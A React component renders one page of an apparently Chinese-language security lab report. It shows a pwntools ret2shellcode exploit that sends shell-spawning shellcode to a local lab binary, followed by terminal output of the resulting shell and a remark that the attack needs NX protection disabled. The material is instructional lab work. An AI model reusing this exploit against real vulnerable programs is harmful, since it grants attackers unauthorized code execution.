import React from 'react';
import { A4Page } from '../shared';
import { KaliTerminal } from './Lab3Part1';

// 实验四 第六部分 - ret2shellcode exp 和结果
export const Lab4Part6: React.FC = () => (
    <A4Page id="lab4-part6">
        <p className="text-sm mb-2">步骤3：编写 exp 脚本</p>
        <KaliTerminal>
{`# ret2shellcode1.py
from pwn import *

context(os = "linux", arch = "i386")
p = process("./ret2shellcode1")

shellcode = asm(shellcraft.sh())
print(f"[*] Shellcode length: {len(shellcode)} bytes")

payload = shellcode
p.sendline(payload)
p.interactive()`}
        </KaliTerminal>

        <p className="text-sm mb-2">步骤4：运行 exp 脚本</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab4]
└─$ python3 ret2shellcode1.py
[*] Shellcode length: 44 bytes
[x] Starting local process './ret2shellcode1'
[+] Starting local process './ret2shellcode1': pid 276184
[*] Switching to interactive mode
$ whoami
kali
$ ls -la
total 112
drwxr-xr-x  2 kali kali  4096 Dec 29 10:33 .
drwx------ 22 kali kali  4096 Dec 29 10:11 ..
-rwxr-xr-x  1 kali kali 15908 Dec 29 10:20 ret2shellcode1
...
$ exit
[*] Stopped process './ret2shellcode1' (pid 276184)`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            ret2shellcode 攻击成功。shellcode 在栈上成功执行，获取了 shell。
            这种攻击方式简单直接，但需要 NX 保护关闭才能实现。
        </p>
    </A4Page>
);

export default Lab4Part6;
